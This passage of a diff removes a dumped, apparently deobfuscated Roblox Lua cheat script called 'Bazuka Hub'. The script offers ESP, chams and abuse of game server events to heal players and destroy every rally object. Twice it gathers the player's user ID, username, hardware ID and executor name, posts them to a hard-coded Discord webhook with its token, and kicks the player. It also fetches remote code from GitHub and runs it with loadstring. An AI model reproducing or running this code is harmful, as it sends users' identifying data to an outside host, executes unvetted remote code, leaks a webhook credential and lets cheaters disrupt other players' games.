-    local _RbxAnalyticsService897 = game:GetService("RbxAnalyticsService")
-    local _898 = _RbxAnalyticsService897.GetClientId
-    local _899 = _898(_RbxAnalyticsService897)
-    local _MarketplaceService900 = game:GetService("MarketplaceService")
-    local _901 = _MarketplaceService900.GetProductInfo
-    local _902 = _901(_MarketplaceService900, game.PlaceId)
-    local _903 = _902.Name
-    local _904, _904_2 = identifyexecutor()
-    local _905, _905_2, _905_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _892, _894, _896, _892, _899, "03/21/2025", "14:26:59", game.PlaceId, _903, game.PlaceId, _904)
-    local _906 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _892
-    local _907 = _906 .. "&width=150&height=150&format=png"
-    local _HttpService908 = game:GetService("HttpService")
-    local _909 = _HttpService908.JSONEncode
-    local _910 = _909(_HttpService908, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _905,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _907,
-                },
-            },
-        },
-    })
-    local _911 = _910.gsub
-    local _912 = _911(_910, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _912,
-    })
-    local _914 = game.Players.LocalPlayer
-    local _915 = _914.Kick
-    _915(_914, "GOT YOU XD!")
-    local _917 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _918 = loadstring(_917)
-    local _919 = _918()
-    local _920 = _919.new
-    local _921 = game.Players.LocalPlayer
-    local _922 = _921.DisplayName
-    local _923 = _920("Bazuka Hub", _922, "Bazuka Hub")
-    local _924 = _923.Category
-    local _925 = _924(_923, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _926 = _923.Category
-    local _927 = _926(_923, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _928 = _923.Category
-    local _929 = _928(_923, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _930 = _923.Category
-    local _931 = _930(_923, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _932 = _923.Category
-    _932(_923, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _934 = Color3.fromRGB
-    _934(255, 255, 255)
-    local _936 = Color3.fromRGB
-    _936(0, 0, 0)
-    local _938 = Color3.fromRGB
-    _938(160, 160, 160)
-    local _940 = Color3.fromRGB
-    _940(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _944 = Color3.fromRGB
-    local _945 = _944(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _948 = Color3.fromRGB
-    local _949 = _948(255, 255, 255)
-    local _950 = Color3.fromRGB
-    local _951 = _950(0, 0, 0)
-    local _952 = Color3.fromRGB
-    local _953 = _952(255, 255, 255)
-    local _954 = Color3.fromRGB
-    local _955 = _954(255, 255, 255)
-    local _956 = Color3.fromRGB
-    local _957 = _956(255, 255, 255)
-    local _958 = Color3.fromRGB
-    local _959 = _958(255, 255, 255)
-    local _960 = Color3.fromRGB
-    local _961 = _960(255, 255, 255)
-    local _962 = Color3.fromRGB
-    local _963 = _962(255, 255, 255)
-    local _964 = game.Players.LocalPlayer
-    local _965 = _964.Name
-    task.spawn(function(_967, _967_2, _967_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_970, _970_2, _970_3)
-    end)
-    task.spawn(function(_972, _972_2, _972_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_975, _975_2, _975_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _976 = _923.Notification
-    _976(_923, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _978 = _925.Button
-    local _979 = _978(_925, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _980 = _979.Section
-    local _981 = _980(_979, "GUI was made by Bazuka_ofcx", "Left")
-    local _982 = _981.Button
-    _982(_981, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_984, _984_2, _984_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _985 = _981.Button
-    _985(_981, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_987, _987_2, _987_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _988 = _979.Section
-    _988(_979, "Information:", "Left")
-    local _990 = _979.Section
-    _990(_979, "Last Update Changelog:", "Right")
-    local _992 = _927.Button
-    local _993 = _992(_927, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _994 = _993.Section
-    local _995 = _994(_993, "Character Exploit", "Left")
-    local _996 = _995.Toggle
-    _996(_995, {
-        Default = false,
-        Description = "Makes You invisible",
-        Title = "Invisible mode",
-    }, function(_998, _998_2, _998_3)
-    end)
-    local _999 = _995.Button
-    _999(_995, {
-        ButtonName = "Heal",
-        Title = "Healing",
-        Description = "",
-    }, function(_1001, _1001_2, _1001_3)
-        local _ReplicatedStorage1002 = game:GetService("ReplicatedStorage")
-        local _1003 = _ReplicatedStorage1002.Events
-        local _1004 = _1003.Heal
-        local _1005 = _1004.FireServer
-        _1005(_1004, _965, 1000)
-    end)
-    local _1007 = _995.Dropdown
-    _1007(_995, {
-        Title = "Heal Target",
-        Default = "You",
-        Multi = false,
-        Options = {
-            All = false,
-            Others = false,
-            You = false,
-        },
-        Description = "Choose one of them",
-    }, function(_1009, _1009_2, _1009_3)
-    end)
-    local _1010 = _993.Section
-    local _1011 = _1010(_993, "Rally Exploit", "Right")
-    local _1012 = _1011.Button
-    _1012(_1011, {
-        ButtonName = "Destroy All Rally",
-        Title = "Destroy All",
-        Description = "",
-    }, function(_1014, _1014_2, _1014_3)
-        local _1015 = workspace.BuildableObjects
-        local _1016 = _1015.GetChildren
-        local _1017 = _1016(_1015)
-        for _1018, _1018_2 in _1017 do
-            local _ = _1018_2.Name
-            local _ReplicatedStorage1020 = game:GetService("ReplicatedStorage")
-            local _1021 = _ReplicatedStorage1020.Events
-            local _1022 = _1021.DestroyObject
-            local _1023 = _1022.FireServer
-            _1023(_1022)
-        end
-    end)
-    local _1025 = _1011.Button
-    _1025(_1011, {
-        ButtonName = "Place Your Rally",
-        Title = "Place Rally",
-        Description = "",
-    }, function(_1027, _1027_2, _1027_3)
-        local _ReplicatedStorage1028 = game:GetService("ReplicatedStorage")
-        local _1029 = _ReplicatedStorage1028.Events
-        local _1030 = _1029.BuildObject
-        local _1031 = _1030.FireServer
-        local _1032 = game.Players.LocalPlayer
-        local _1033 = _1032.PlayerData
-        local _1034 = _1033.TeamValue
-        local _1035 = _1034.Value
-        local _ReplicatedStorage1036 = game:GetService("ReplicatedStorage")
-        local _1037 = _ReplicatedStorage1036.Assets
-        local _1038 = _1037.Buildable
-        local _1039 = game.Players.LocalPlayer
-        local _1040 = _1039.PlayerData
-        local _1041 = _1040.TeamValue
-        local _1042 = _1041.Value
-        local _1043 = "Team" .. _1042
-        local _1044 = _1038[_1043]
-        local _1045 = _1044.RFL
-        local _1046 = _1045.RallyPoint
-        local _1047 = game.Players.LocalPlayer
-        local _1048 = _1047.Character
-        local _1049 = _1048.Torso
-        local _1050 = _1049.CFrame
-        local _1051 = game.Players.LocalPlayer
-        local _1052 = _1051.PlayerData
-        local _1053 = _1052.FireteamID
-        local _1054 = _1053.Value
-        _1031(_1030, _1035, "Rally", _1046, _1050, _1054)
-    end)
-    local _1056 = _929.Button
-    local _1057 = _1056(_929, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _1058 = _1057.Section
-    local _1059 = _1058(_1057, "Ð¡ustom Time", "Left")
-    local _1060 = _1059.Toggle
-    _1060(_1059, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1062, _1062_2, _1062_3)
-    end)
-    local _1063 = _1059.Slider
-    _1063(_1059, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_1065, _1065_2, _1065_3)
-        math.floor(_1065)
-    end)
-    local _1067 = _1059.Slider
-    _1067(_1059, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_1069, _1069_2, _1069_3)
-        math.floor(_1069)
-    end)
-    local _1071 = _1057.Section
-    local _1072 = _1071(_1057, "Custom Fog", "Right")
-    local _1073 = _1072.Toggle
-    _1073(_1072, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1075, _1075_2, _1075_3)
-    end)
-    local _1076 = _1072.Slider
-    _1076(_1072, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_1078, _1078_2, _1078_3)
-        math.floor(_1078)
-    end)
-    local _1080 = _1072.Slider
-    _1080(_1072, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_1082, _1082_2, _1082_3)
-        math.floor(_1082)
-    end)
-    type(_945)
-    local _ = _945.r
-    local _ = _945.g
-    local _ = _945.b
-    local _1088 = _1072.ColorPicker
-    local _1089 = Color3.new
-    local _1090 = _1089()
-    _1088(_1072, {
-        Default = _1090,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_1092, _1092_2, _1092_3)
-    end)
-    local _1093 = _1057.Section
-    local _1094 = _1093(_1057, "Vision Upgrade", "Left")
-    local _1095 = _1094.Toggle
-    _1095(_1094, {
-        Default = false,
-        Description = "Crop Overlay Disabler",
-        Title = "No Crop",
-    }, function(_1097, _1097_2, _1097_3)
-    end)
-    local _1098 = _1094.Toggle
-    _1098(_1094, {
-        Default = false,
-        Description = "",
-        Title = "FullBright",
-    }, function(_1100, _1100_2, _1100_3)
-    end)
-    local _1101 = _1094.Slider
-    _1101(_1094, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 10,
-        Default = 0,
-        Description = "Changes the FB",
-    }, function(_1103, _1103_2, _1103_3)
-        math.floor(_1103)
-    end)
-    local _1105 = _1094.Toggle
-    _1105(_1094, {
-        Default = false,
-        Description = "",
-        Title = "Custom FOV",
-    }, function(_1107, _1107_2, _1107_3)
-    end)
-    local _1108 = _1094.Slider
-    _1108(_1094, {
-        Min = 0,
-        Title = "FOV",
-        Max = 120,
-        Default = 80,
-        Description = "",
-    }, function(_1110, _1110_2, _1110_3)
-        math.floor(_1110)
-    end)
-    local _1112 = _929.Button
-    local _1113 = _1112(_929, "Local Chams", "http://www.roblox.com/asset/?id=3237146652")
-    local _1114 = _1113.Section
-    local _1115 = _1114(_1113, "Viewmodel Chams", "Left")
-    local _1116 = _1115.Slider
-    _1116(_1115, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 0,
-        Description = "",
-    }, function(_1118, _1118_2, _1118_3)
-        local _1119, _1119_2, _1119_3 = math.floor(_1118)
-        local _ = _1119 / 100
-    end)
-    type(_949)
-    local _ = _949.r
-    local _ = _949.g
-    local _ = _949.b
-    local _1125 = _1115.ColorPicker
-    local _1126 = Color3.new
-    local _1127 = _1126()
-    _1125(_1115, {
-        Default = _1127,
-        Description = "",
-        Title = "Color",
-    }, function(_1129, _1129_2, _1129_3)
-    end)
-    local _1130 = _1115.Dropdown
-    _1130(_1115, {
-        Title = "Material",
-        Default = "Plastic",
-        Multi = false,
-        Options = {
-            Rubber = false,
-            ForceField = false,
-            ClayRoofTiles = false,
-            CeramicTiles = false,
-            Sandstone = false,
-            DiamondPlate = false,
-            Cobblestone = false,
-            Plaster = false,
-            Slate = false,
-            Granite = false,
-            Plastic = false,
-            RoofShingles = false,
-            CrackedLava = false,
-            LeafyGrass = false,
-            Glass = false,
-            Neon = false,
-            Sand = false,
-            Carpet = false,
-            WoodPlanks = false,
-            Wood = false,
-            Salt = false,
-            Marble = false,
-            CorrodedMetal = false,
-            Glacier = false,
-            SmoothPlastic = false,
-            Ground = false,
-            Snow = false,
-            Rock = false,
-            Grass = false,
-            Basalt = false,
-            Pavement = false,
-            Brick = false,
-            Mud = false,
-            Limestone = false,
-            Metal = false,
-            Leather = false,
-            Ice = false,
-            Foil = false,
-            Fabric = false,
-            Concrete = false,
-            Pebble = false,
-            Asphalt = false,
-            Cardboard = false,
-        },
-        Description = "Choose one of them",
-    }, function(_1132, _1132_2, _1132_3)
-        for _1133, _1133_2 in _1132 do
-        end
-    end)
-    local _1134 = _1113.Section
-    local _1135 = _1134(_1113, "Weapon Chams", "Right")
-    local _1136 = _1135.Slider
-    _1136(_1135, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 0,
-        Description = "",
-    }, function(_1138, _1138_2, _1138_3)
-        local _1139, _1139_2, _1139_3 = math.floor(_1138)
-        local _ = _1139 / 100
-    end)
-    type(_951)
-    local _ = _951.r
-    local _ = _951.g
-    local _ = _951.b
-    local _1145 = _1135.ColorPicker
-    local _1146 = Color3.new
-    local _1147 = _1146()
-    _1145(_1135, {
-        Default = _1147,
-        Description = "",
-        Title = "Color",
-    }, function(_1149, _1149_2, _1149_3)
-    end)
-    local _1150 = _1135.Dropdown
-    _1150(_1135, {
-        Title = "Material",
-        Default = "Plastic",
-        Multi = false,
-        Options = {
-            Rubber = false,
-            ForceField = false,
-            ClayRoofTiles = false,
-            CeramicTiles = false,
-            Sandstone = false,
-            DiamondPlate = false,
-            Cobblestone = false,
-            Plaster = false,
-            Slate = false,
-            Granite = false,
-            Plastic = false,
-            RoofShingles = false,
-            CrackedLava = false,
-            LeafyGrass = false,
-            Glass = false,
-            Neon = false,
-            Sand = false,
-            Carpet = false,
-            WoodPlanks = false,
-            Wood = false,
-            Salt = false,
-            Marble = false,
-            CorrodedMetal = false,
-            Glacier = false,
-            SmoothPlastic = false,
-            Ground = false,
-            Snow = false,
-            Rock = false,
-            Grass = false,
-            Basalt = false,
-            Pavement = false,
-            Brick = false,
-            Mud = false,
-            Limestone = false,
-            Metal = false,
-            Leather = false,
-            Ice = false,
-            Foil = false,
-            Fabric = false,
-            Concrete = false,
-            Pebble = false,
-            Asphalt = false,
-            Cardboard = false,
-        },
-        Description = "Choose one of them",
-    }, function(_1152, _1152_2, _1152_3)
-        for _1153, _1153_2 in _1152 do
-        end
-    end)
-    local _1154 = _929.Button
-    local _1155 = _1154(_929, "Enemy Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _1156 = _1155.Section
-    local _1157 = _1156(_1155, "Chams", "Left")
-    local _1158 = _1157.Toggle
-    _1158(_1157, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1160, _1160_2, _1160_3)
-    end)
-    local _1161 = _1157.Slider
-    _1161(_1157, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_1163, _1163_2, _1163_3)
-        local _1164, _1164_2, _1164_3 = math.floor(_1163)
-        local _ = _1164 / 100
-    end)
-    type(_953)
-    local _ = _953.r
-    local _ = _953.g
-    local _ = _953.b
-    local _1170 = _1157.ColorPicker
-    local _1171 = Color3.new
-    local _1172 = _1171()
-    _1170(_1157, {
-        Default = _1172,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_1174, _1174_2, _1174_3)
-    end)
-    local _1175 = _1157.Slider
-    _1175(_1157, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_1177, _1177_2, _1177_3)
-        local _1178, _1178_2, _1178_3 = math.floor(_1177)
-        local _ = _1178 / 100
-    end)
-    type(_955)
-    local _ = _955.r
-    local _ = _955.g
-    local _ = _955.b
-    local _1184 = _1157.ColorPicker
-    local _1185 = Color3.new
-    local _1186 = _1185()
-    _1184(_1157, {
-        Default = _1186,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_1188, _1188_2, _1188_3)
-    end)
-    local _1189 = _1155.Section
-    local _1190 = _1189(_1155, "ESP", "Right")
-    local _1191 = _1190.Toggle
-    _1191(_1190, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1193, _1193_2, _1193_3)
-    end)
-    local _1194 = _1190.Slider
-    _1194(_1190, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_1196, _1196_2, _1196_3)
-        local _1197, _1197_2, _1197_3 = math.floor(_1196)
-        local _ = _1197 / 100
-    end)
-    local _1199 = _1190.Toggle
-    _1199(_1190, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_1201, _1201_2, _1201_3)
-    end)
-    local _1202 = _1190.Toggle
-    _1202(_1190, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_1204, _1204_2, _1204_3)
-    end)
-    local _1205 = _1190.Toggle
-    _1205(_1190, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_1207, _1207_2, _1207_3)
-    end)
-    local _1208 = _1190.Toggle
-    _1208(_1190, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_1210, _1210_2, _1210_3)
-    end)
-    local _1211 = _1190.Slider
-    _1211(_1190, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_1213, _1213_2, _1213_3)
-        math.floor(_1213)
-    end)
-    type(_961)
-    local _ = _961.r
-    local _ = _961.g
-    local _ = _961.b
-    local _1219 = _1190.ColorPicker
-    local _1220 = Color3.new
-    local _1221 = _1220()
-    _1219(_1190, {
-        Default = _1221,
-        Description = "",
-        Title = "Text Color",
-    }, function(_1223, _1223_2, _1223_3)
-    end)
-    local _1224 = _929.Button
-    local _1225 = _1224(_929, "Allie Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _1226 = _1225.Section
-    local _1227 = _1226(_1225, "Chams", "Left")
-    local _1228 = _1227.Toggle
-    _1228(_1227, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1230, _1230_2, _1230_3)
-    end)
-    local _1231 = _1227.Slider
-    _1231(_1227, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_1233, _1233_2, _1233_3)
-        local _1234, _1234_2, _1234_3 = math.floor(_1233)
-        local _ = _1234 / 100
-    end)
-    type(_957)
-    local _ = _957.r
-    local _ = _957.g
-    local _ = _957.b
-    local _1240 = _1227.ColorPicker
-    local _1241 = Color3.new
-    local _1242 = _1241()
-    _1240(_1227, {
-        Default = _1242,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_1244, _1244_2, _1244_3)
-    end)
-    local _1245 = _1227.Slider
-    _1245(_1227, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_1247, _1247_2, _1247_3)
-        local _1248, _1248_2, _1248_3 = math.floor(_1247)
-        local _ = _1248 / 100
-    end)
-    type(_959)
-    local _ = _959.r
-    local _ = _959.g
-    local _ = _959.b
-    local _1254 = _1227.ColorPicker
-    local _1255 = Color3.new
-    local _1256 = _1255()
-    _1254(_1227, {
-        Default = _1256,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_1258, _1258_2, _1258_3)
-    end)
-    local _1259 = _1225.Section
-    local _1260 = _1259(_1225, "ESP", "Right")
-    local _1261 = _1260.Toggle
-    _1261(_1260, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1263, _1263_2, _1263_3)
-    end)
-    local _1264 = _1260.Slider
-    _1264(_1260, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_1266, _1266_2, _1266_3)
-        local _1267, _1267_2, _1267_3 = math.floor(_1266)
-        local _ = _1267 / 100
-    end)
-    local _1269 = _1260.Toggle
-    _1269(_1260, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_1271, _1271_2, _1271_3)
-    end)
-    local _1272 = _1260.Toggle
-    _1272(_1260, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_1274, _1274_2, _1274_3)
-    end)
-    local _1275 = _1260.Toggle
-    _1275(_1260, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_1277, _1277_2, _1277_3)
-    end)
-    local _1278 = _1260.Toggle
-    _1278(_1260, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_1280, _1280_2, _1280_3)
-    end)
-    local _1281 = _1260.Slider
-    _1281(_1260, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_1283, _1283_2, _1283_3)
-        math.floor(_1283)
-    end)
-    type(_963)
-    local _ = _963.r
-    local _ = _963.g
-    local _ = _963.b
-    local _1289 = _1260.ColorPicker
-    local _1290 = Color3.new
-    local _1291 = _1290()
-    _1289(_1260, {
-        Default = _1291,
-        Description = "",
-        Title = "Text Color",
-    }, function(_1293, _1293_2, _1293_3)
-    end)
-    local _1294 = _931.Button
-    local _1295 = _1294(_931, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _1296 = _1295.Section
-    local _1297 = _1296(_1295, "Character Actions", "Left")
-    local _1298 = _1297.Button
-    _1298(_1297, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_1300, _1300_2, _1300_3)
-        local _TeleportService1301 = game:GetService("TeleportService")
-        local _1302 = _TeleportService1301.Teleport
-        local _Players1303 = game:GetService("Players")
-        local _1304 = _Players1303.LocalPlayer
-        _1302(_TeleportService1301, game.PlaceId, _1304)
-    end)
-    local _1306 = Instance.new
-    local _1307 = _1306("ScreenGui", game.CoreGui)
-    local _1308 = Instance.new
-    local _1309 = _1308("TextButton")
-    _1309.BackgroundTransparency = 1
-    local _1310 = UDim2.new
-    local _1311 = _1310(0, 0, 0, 0)
-    _1309.Size = _1311
-    _1309.Text = " "
-    _1309.Parent = _1307
-    local _1312 = Instance.new
-    local _1313 = _1312("ScreenGui", game.CoreGui)
-    _1313.Name = "BackgroundScreenGui"
-    _1313.Enabled = true
-    local _1314 = Instance.new
-    local _1315 = _1314("TextLabel", _1313)
-    _1315.Name = "BackgroundLabel"
-    local _1316 = Instance.new
-    local _1317 = _1316("UIGradient", _1315)
-    _1317.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _1364
-fenv.backgroundgradientcolor2 = _1366
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _1368
-fenv.customshadowcolor = _1370
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 16
-fenv.jumpheightmultiplier = false
-fenv.jumpheightplayer = 7.2
-fenv.originaltime = _1371
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.originalfogcolor = _1372
-fenv.customfogcolor = _1374
-fenv.originalfogend = _1375
-fenv.customfogend = 1000
-fenv.originalfogstart = _1376
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.norollcoooldown = false
-fenv.autocollect = false
-fenv.autosellall = false
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.autosellall = _1409
-fenv.autocollect = _1412
-fenv.norollcoooldown = _1417
-fenv.changetimestatus = _1424
-fenv.hours = _1428
-fenv.minutes = _1432
-fenv.changefogstatus = _1437
-fenv.customfogend = _1441
-fenv.customfogstart = _1445
-fenv.b = _1449
-fenv.g = _1448
-fenv.r = _1447
-fenv.customfogcolor = _1454
-fenv.jumpheightmultiplier = _1483
-fenv.jumpheightplayer = _1487
-fenv.walkspeedmultiplier = _1492
-fenv.walkspeedplayer = _1496
-fenv.ssor = function(_1319, _1319_2, _1319_3)
-    local _1320 = game.Players.LocalPlayer
-    local _1321 = _1320.UserId
-    local _1322 = game.Players.LocalPlayer
-    local _1323 = _1322.DisplayName
-    local _1324 = game.Players.LocalPlayer
-    local _1325 = _1324.Name
-    local _RbxAnalyticsService1326 = game:GetService("RbxAnalyticsService")
-    local _1327 = _RbxAnalyticsService1326.GetClientId
-    local _1328 = _1327(_RbxAnalyticsService1326)
-    local _MarketplaceService1329 = game:GetService("MarketplaceService")
-    local _1330 = _MarketplaceService1329.GetProductInfo
-    local _1331 = _1330(_MarketplaceService1329, game.PlaceId)
-    local _1332 = _1331.Name
-    local _1333, _1333_2 = identifyexecutor()
-    local _1334, _1334_2, _1334_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _1321, _1323, _1325, _1321, _1328, "03/21/2025", "14:26:59", game.PlaceId, _1332, game.PlaceId, _1333)
-    local _1335 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _1321
-    local _1336 = _1335 .. "&width=150&height=150&format=png"
-    local _HttpService1337 = game:GetService("HttpService")
-    local _1338 = _HttpService1337.JSONEncode
-    local _1339 = _1338(_HttpService1337, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _1334,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _1336,
-                },
-            },
-        },
-    })
-    local _1340 = _1339.gsub
-    local _1341 = _1340(_1339, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _1341,
-    })
-    local _1343 = game.Players.LocalPlayer
-    local _1344 = _1343.Kick
-    _1344(_1343, "GOT YOU XD!")
-    local _1346 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _1347 = loadstring(_1346)
-    local _1348 = _1347()
-    local _1349 = _1348.new
-    local _1350 = game.Players.LocalPlayer
-    local _1351 = _1350.DisplayName
-    local _1352 = _1349("Bazuka Hub", _1351, "Bazuka Hub")
-    local _1353 = _1352.Category
-    local _1354 = _1353(_1352, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _1355 = _1352.Category
-    local _1356 = _1355(_1352, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1357 = _1352.Category
-    local _1358 = _1357(_1352, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _1359 = _1352.Category
-    local _1360 = _1359(_1352, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _1361 = _1352.Category
-    _1361(_1352, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _1363 = Color3.fromRGB
-    _1363(255, 255, 255)
-    local _1365 = Color3.fromRGB
-    _1365(0, 0, 0)
-    local _1367 = Color3.fromRGB
-    _1367(160, 160, 160)
-    local _1369 = Color3.fromRGB
-    _1369(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _1373 = Color3.fromRGB
-    local _1374 = _1373(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    task.spawn(function(_1378, _1378_2, _1378_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_1381, _1381_2, _1381_3)
-    end)
-    task.spawn(function(_1383, _1383_2, _1383_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_1386, _1386_2, _1386_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _1387 = _1352.Notification
-    _1387(_1352, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _1389 = _1354.Button
-    local _1390 = _1389(_1354, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _1391 = _1390.Section
-    local _1392 = _1391(_1390, "GUI was made by Bazuka_ofcx", "Left")
-    local _1393 = _1392.Button
-    _1393(_1392, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_1395, _1395_2, _1395_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1396 = _1392.Button
-    _1396(_1392, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_1398, _1398_2, _1398_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1399 = _1390.Section
